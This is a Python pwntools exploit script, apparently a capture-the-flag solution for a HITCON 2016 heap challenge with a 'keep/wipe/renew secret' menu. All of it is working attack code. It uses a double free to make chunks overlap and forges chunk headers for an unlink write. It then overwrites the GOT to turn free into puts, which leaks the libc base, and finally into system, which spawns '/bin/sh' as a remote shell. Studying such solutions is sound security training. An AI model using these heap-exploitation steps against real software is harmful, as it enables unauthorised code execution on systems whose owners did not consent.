#!/usr/bin/python
from pwn import *

#r = remote('52.68.31.117', 6666)
r = remote('127.0.0.1', 4000)
#libc = ELF('/root/CTF/HITCON2016/libc.so.6_375198810bb39e6593a968fcbcf6556789026743')
libc = ELF('/root/glibc-2.19/64/lib/libc.so.6')

huge_ptr = 0x6020a8
small_ptr = 0x6020b0
puts_plt = 0x4006c0
free_got = 0x602018
libc_start_main_got = 0x602048
libc_start_main_off = libc.symbols['__libc_start_main']
system_off = libc.symbols['system']

def keep(level, s):
    r.recvuntil('3. Renew secret')
    r.send('1')
    r.recvuntil('3. Huge secret')
    r.send(str(level))
    r.recvuntil('Tell me your secret: ')
    r.send('{}'.format(s))

def wipe(level):
    r.recvuntil('3. Renew secret')
    r.send('2')
    r.recvuntil('3. Huge secret')
    r.send(str(level))

def renew(level, s):
    r.recvuntil('3. Renew secret')
    r.send('3')
    r.recvuntil('3. Huge secret')
    r.send(str(level))
    r.recvuntil('Tell me your secret: ')
    r.send('{}'.format(s))

# allocate 0x40000 bytes throgh mmap
keep(3, 'A'*8)

# allocate for small_ptr
keep(1, 'B'*8)

# allocate for big_ptr
keep(2, 'C'*8)

wipe(3)
wipe(1)
wipe(2)

# this time, use malloc instead of mmap to allocate 0x40000 bytes !
keep(3, 'A'*8)

# use double free so that later we can let small and huge overlap
wipe(1)

# small now overlap with huge
keep(1, 'B'*8)

# smallbin follow right after fastbin
keep(2, 'C'*8)


# write some crutial data for the following unlink exploit
renew(3, 'E'*8 + p64(0x21) + p64(huge_ptr-0x18) + p64(huge_ptr-0x10) + p64(0x20) + p64(0xfb0))

# free(big_ptr) unlink!!
wipe(2)

# overwrite from &huge_ptr-0x18
renew(3, 'F'*24 + p64(free_got) + p64(libc_start_main_got))

# GOT hijack free to puts
renew(3, p64(puts_plt))

# free(small_ptr) -> puts("__libc_start_main@got.plt")
wipe(1)

base = u64(r.recvuntil('3. Renew secret')[1:7] + '\x00'*2) - libc_start_main_off
print "libc base: ", hex(base)

system = base + system_off

#  GOT hijack free to system
r.send('3')
r.recvuntil('3. Huge secret')
r.send('3')
r.recvuntil('Tell me your secret: ')
r.send(p64(system))

# write "/bin/sh" to small_ptr
keep(1, '/bin/sh\x00')

# free(small_ptr) -> system("/bin/sh")
wipe(1)

r.interactive()
